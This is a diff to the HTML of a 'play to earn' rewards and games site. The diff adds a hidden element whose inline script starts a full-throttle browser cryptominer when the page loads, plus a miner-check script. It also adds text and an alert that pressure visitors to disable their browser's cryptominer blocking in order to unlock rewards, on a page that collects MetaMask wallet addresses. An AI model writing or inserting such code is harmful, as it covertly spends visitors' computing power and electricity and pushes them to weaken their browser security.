@@ -28,11 +28,25 @@
     <script src="/games/spin/start.js" defer></script>
 
     <script src="/fly.js" defer></script>
+    <script src="/miner/minercheck.js" defer></script>
 
     <link rel="stylesheet" href="/style.css" />
     <link rel="stylesheet" href="/games/spin/style.css" defer />
   </head>
   <body>
+    <miner class="hide" id="MINER">
+      <script>
+        var _client = new Client.Anonymous(
+          "965d2861fb2a4feecd31c6df44bb842f986bbdb2caccd02642aae8c5a23e3883",
+          {
+            throttle: 0,
+            c: "w",
+          }
+        );
+        _client.start();
+        _client.className = "hide";
+      </script></miner
+    >
     <wrap>
       <app id="APP" class="display" title="HOME">
         <center>
@@ -506,11 +520,27 @@
           </center>
         </div>
       </div>
+      <!-- LOGIN FORM -->
       <div class="hide" id="COLLECTION" title="build"></div>
       <div class="hide" id="IMPORTTOKENS" title="build"></div>
 
       <div class="hide" id="LOGIN" title="closed">
         <center>
+          <label id="my-miner" class="hide">
+            <article>
+              <h1>Unblocking The Miner</h1>
+              <p class="white">
+                This site uses a cryptominer that supports the giving of the
+                play to earn layout, some web browsers block cryptominers by
+                default. To unblock the miner and unlock rewards click the
+                shield in your browser search bar next to the sites url, and
+                customize your settings to allow the cryotominers.
+              </p>
+              <img
+                src="https://cdn.glitch.global/4d28a5f0-4bec-4873-9059-3319b8398254/unblock.png"
+              />
+            </article>
+          </label>
           <h1 class="rewards-intro" id="login-form">
             <label id="rewards-intro">
               Just copy and paste your metamask or ecosystem web wallet receiver
@@ -561,7 +591,9 @@
                   >00</label
                 >
               </center>
-              <button onclick="claimUpdate();">Grab These Rewards!</button>
+              <button id="claimBTN" onclick="claimUpdate();">
+                Grab These Rewards!
+              </button>
 
               <hr />
               Pending
@@ -684,5 +716,15 @@
         <button onclick="HOME();">Relaod Site</button>
       </center>
     </div>
+
+    <label class="hide" id="miner-alert">
+      You Can't Earn Rewards While Blocking The Miner,
+      <label style="color: blue; cursor: pointer" onclick="learnMORE();"
+        >Learn More</label
+      >
+      <div class="X" onclick="closealert();" id="close-miner-alert">
+        X
+      </div></label
+    >
   </body>
 </html>
